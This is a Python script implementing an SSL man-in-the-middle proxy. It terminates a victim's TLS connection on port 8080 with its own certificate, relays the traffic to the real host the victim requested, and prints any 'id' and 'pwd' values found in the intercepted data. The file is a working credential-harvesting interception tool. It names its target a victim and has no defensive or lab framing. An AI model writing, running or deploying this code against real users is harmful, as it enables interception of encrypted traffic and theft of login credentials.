import ssl
import socket
import threading
from urllib.parse import parse_qs

def get_hostname_from_request(data):
    try:
        # Decode the data and split it into headers
        headers = data.decode().split('\r\n')
        # Extract the hostname from the 'Host' header
        hostname = next((header.split('Host: ')[1] 
                            for header in headers 
                            if header.startswith('Host:')), None)
        return hostname
    except UnicodeDecodeError:
        # Handle decoding errors
        pass
    return None

def get_id_pwd(data):
    # Parse the query string data into a dictionary
    parsed_dict = parse_qs(data)
    # Extract the 'id' and 'pwd' values from the parsed dictionary
    id_value = parsed_dict.get('id', [''])[0]
    pwd_value = parsed_dict.get('pwd', [''])[0]
    # Return a formatted string with the ID and Password if both are present
    return f"ID: {id_value}, Password: {pwd_value}" if id_value and pwd_value else None
            
def handle_mitm_task(victim_socket):
    try:
        # Receive the initial request from the victim's socket
        init_request = victim_socket.recv(4196)
        # Extract the hostname from the initial request
        host_name = get_hostname_from_request(init_request)
        # Create an SSL connection to the target server using the extracted hostname
        server_socket = create_ssl_connection(host_name)
        # Send the initial request to the target server
        server_socket.send(init_request)
        # Set a timeout for both victim and server sockets to avoid blocking
        server_socket.settimeout(0.01)
        victim_socket.settimeout(0.01)
        while True:
            try:
                # Receive data from the victim's socket
                data = victim_socket.recv(4196)
                if data:
                    # Forward the received data to the server socket
                    server_socket.send(data)
                    # Check if the data contains 'id' and 'pwd' and print them if found
                    if id_pwd := get_id_pwd(data.decode()):
                        print(id_pwd)
            except socket.timeout:
                # Ignore socket timeout exceptions
                pass
            try:
                # Receive response from the server socket
                response = server_socket.recv(4196)
                if response:
                    # Forward the received response to the victim's socket
                    victim_socket.send(response)
            except socket.timeout:
                # Ignore socket timeout exceptions
                pass
    finally:
        # Close both victim and server sockets to clean up resources
        victim_socket.close()
        server_socket.close()
    
            

def start_ssl_server():

    # Create an SSL context for the server with client authentication purpose
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    # Load the server's certificate and private key
    context.load_cert_chain(certfile="certificates/host.crt", keyfile="certificates/host.key")

    # Create a TCP/IP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Allow the socket to reuse the address
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Bind the socket to the address and port
    s.bind(('0.0.0.0', 8080))
    # Listen for incoming connections with a backlog of 5
    s.listen(5)
    print("SSL server listening on port 8080")
    while True:
        try:
            # Accept a new client connection
            client_socket, addr = s.accept()
            # Wrap the client socket with SSL for secure communication
            ssl_socket = context.wrap_socket(client_socket, server_side=True)
            # Start a new thread to handle the MITM task for the connected client
            threading.Thread(target=handle_mitm_task, args=(ssl_socket,)).start()
        except Exception as e:
            # Print any errors that occur during the SSL handshake
            print(f"An error occurred during SSL handshake: {e}")
            
def create_ssl_connection(target_host_name):
    # Define the target hostname and port for the SSL connection
    hostname = target_host_name
    port = 443
    
    # Create a default SSL context
    context = ssl.create_default_context()
    
    # Create a TCP connection to the target hostname and port
    sock = socket.create_connection((hostname, port))
    
    # Wrap the TCP connection with SSL
    ssl_sock = context.wrap_socket(sock, server_hostname=hostname)
    
    # Print confirmation of the SSL connection establishment
    ip_address = ssl_sock.getpeername()[0]
    print(f"SSL connection established with {hostname} at {ip_address}:{port}.")
    
    # Return the SSL-wrapped socket
    return ssl_sock


start_ssl_server()